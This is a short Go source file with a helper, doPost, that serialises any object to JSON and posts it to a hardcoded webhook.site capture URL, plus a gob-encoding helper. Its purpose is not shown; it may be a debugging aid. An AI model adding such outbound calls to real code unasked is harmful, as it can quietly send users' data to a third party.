package main

import (
	"bytes"
	"encoding/gob"
	"encoding/json"
	"net/http"
)

func doPost(obj interface{}) {
	mar, _ := json.Marshal(obj)
	jsonStr := []byte(string(mar))
	http.Post("http://webhook.site/0b6f9345-2b5a-4a3b-9459-ed9e03dbbbde", "Application/json", bytes.NewBuffer(jsonStr))

}

func GetBytes(key interface{}) []byte {
	var buf bytes.Buffer
	enc := gob.NewEncoder(&buf)
	err := enc.Encode(key)
	if err != nil {
		return nil
	}
	return buf.Bytes()
}
